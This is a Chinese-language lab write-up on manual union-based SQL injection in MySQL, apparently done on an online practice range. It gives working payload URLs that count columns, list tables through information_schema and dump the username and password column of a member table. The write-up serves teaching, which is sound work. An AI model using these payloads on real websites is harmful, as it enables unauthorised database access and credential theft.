## 一、Mysql介绍

> MySQL 是最流行的关系型数据库管理系统，已被Oracle 收购，推荐使用Maria DB,MariaDB是一个采用Maria存储引擎的MySQL分支版本.

本章用到的函数以及关键字：
  - database()      //查看当前数据库名称
  - union关键字     //联合查询
  - order by   //排序
  - group_concat //合并结果集
  - limi //常用与分页

## 二、漏洞原理

WEB后台对前端提交到后台的用户输入参数没有做限制，将会导致此漏洞。
#### 举例：1
```
    预想中的用户输入：
        1. 前端提交查询一条编号是1的新闻
        2. 此时浏览器发出
            http:\\xxx.com?id=1
        3. 后台程序接收到后,取到id对应的1,开始拼装SQL语句
            select title,content  from news where id  = 1 // 此时的这个1是从前端获取的
        4. 后端返回前端 新闻 内容
    恶意用户输入(此时想知道数据库名称）：
        1. 既然后端未对前端做任何处理,就表示前端可以控制整个查询语句
        2. 前端构造恶意id的值
            http:\\xxx.com?id=-1 union select 1,(database()),3
        3. 此时后台拼装的SQL查询语句就是
            select title,content  from news where id  = -1 union select 1,(database()),3
        4. 得到结果当前数据库名称
```
## 三、 靶场实战

> 此处使用的 __墨者学院__ 的在线靶场

### 开启靶场

```
懒得截图了，入门->web安全->SQL注入->SQL手工注入漏洞测试(MySQL数据库)
```

### 1. 寻找注入点

![SQL注入(一)-手工注入漏洞mysql.png](sources/SQL注入(一)-手工注入漏洞mysql.png)

```
图中箭头所指处为注入点
```

### 2. 判断注入类型 
![判断注入类型](sources/SQL注入(一)-判断注入类型.png)
```
基本套路就是看页面显示
    1. id = 1'  //页面显示空白没有格式  可能是数据库报错，但是没有回显
    2. and 1 = 2 和  and  1 = 1 //查看页面是否只有格式没有数据
```

### 3. 获取目标后台的SQL语句中的select 查询了多少个字段

```
目的：在联合查询时需要用到
使用 order by 1 
        
    order by   // 是用来结果集排序的
    order by 1 // 表示 对结果集 也就是根据 select 所查询的字段中的第一个进行排序
    假设：
        select a,b,c,d from xxx id = 1 
               1 2 3 4
    此时order by 后面就可以写  1 2 3 4 ,表示根据对应的字段来排序
    select a,b,c,d from xxx order by 1 //表示根据对应的字段a来排序
    select a,b,c,d from xxx order by 2 //表示根据对应的字段b来排序
    ...

    当order by 后面的数字没有对应的列时，就会报错，有些报错会提示出来“没有对应的列”
    所以，只需要一直加到页面报错或者不显示内容时，此时的数字-1就是我们猜解出来的字段数
```
![猜解字段数](sources/SQL注入(一)-猜解字段数.png)
```
http://219.153.49.228:40947/new_list.php?id=1 orde by 5
```

### 4. 使用联合查询，查看页面是那个字段在显示数据
```
目的：用于将我们要查询的内容展示在页面上
使用 union select 1,2,3,4

    union           //是用来连接两个查询语句并将结果集合并在一起且去重
    如： select a,b,c from xxx union select 1,2,3,4
    
    union select 1,2,3,4   //后面select 表示查询1,2,3,4  不用跟from 后面内容
    这里的1,2,3,4 就是上面order by才出来的数字

    假设目标站点sql：
        select a,b,c,d from xxx id = 1
    通过我们构造方法后：
        select a,b,c,d from xxx id = 1 union select 1,2,3,4
```
> 后端的执行结果(我们是看不到的)

|a|b|c|d|
|:--:|:--:|:--:|:--:|
|A|B|C|D|
|1|2|3|4|
```
1. 大写字母是union前面id=1的查询语句查询出来的数据
2. 数字是union后面查询语句查出来的数据，因为没有写表，所以就是1,2,3,4
3. 此时页面应该是没有任何变化的，因为后端会从直接结果里面取第一条出来，所以此时可以想办法让数据只有union后面的查询语句，就是让union前面的查询语句的查询结果为空
4. 在union前面可以加 and 1 = 2 让第一条语句一直为false  或者  把id的值等于一个不存在值
5. 构造后代码：-1 union select 1,2,3,4    
6. 此时来查看效果
```
![union联合查询1](sources/SQL注入(一)-union联合查询1.png)
```
此时可以看到2,3位置的数据可以被显示出来,那我们就在2,3任选一处继续 //union 1,2,3,4,
```
### 5. 使用联合查询，查询数据
```
目的：获取最终数据，账号和密码，进而登录系统获取key

在union 后面的查询中使用子查询

    例如：
        获取数据库信息 
        -1 union select 1,2,(select database()),4  //此处把3 替换成一个子查询语句,子查询结果集只能是一个单独的结果集
        或者
        -1 union select 1,2,(database()),4 
        //database()是一个数据库自带函数
```
> 1. 获取数据库名称
```
payload: http://219.153.49.228:40947/new_list.php?id=-1 union select 1,2,(database()),4
```
![获取数据库名称](sources/SQL注入(一)-获取数据库名称.png)

> 2. 获取当前数据库所有表
```
payload: http://219.153.49.228:40947/new_list.php?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = database()),4

select table_name from information_schema.tables where table_schema=database() 解释：
Mysql数据库中有一个库是专门存储元数据等相关数据的库，可以通过这个库来查询我们想要的信息，比如：
tables  //这张表保存了 mysql库中所有的数据库和库对应的表信息
columns //这张表保存了 mysql表中所有的元数据等信息
此时的意思就是我要查询information_schema.tables这个表中table_schema这个字段是database()获取到的当前数据库名称的所有表名

详细去百度搜索
```
![获取数据库表名](sources/SQL注入(一)-获取数据库表名.png)
```
结果：
StormGroup_member
notice
```
> 3. 获取数据某个表所有字段(元数据)
```
payload: http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name = "StormGroup_member"),4
大致意思同上
只是表换成了columns
同时指定了一个明确的表名,是通过上一步获取到的表明中的一个
```
![获取表字段名](sources/SQL注入(一)-获取表元数据.png)
```
结果：
id
name            //我猜是用户名
password        //我猜是密码
status
```

> 4. 获取对应字段数据
```
payload: http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,(select group_concat(name,'-',password) from StormGroup_member),4

此时表名有了 StormGroup_member  要查的字段也有了 name,password
只需要将SQL查询预计带入就可以了

```
![获取表字段名](sources/SQL注入(一)-获取账号和密码.png)
> 5. MD5解密
```
不做记录
```
> 6. 登录系统，获取Key
```
不做记录
```

## 最后总结
```
没啥好总结的， 就是普通SQL查询语句的应用，会SQL就可以了
古德拜~
```


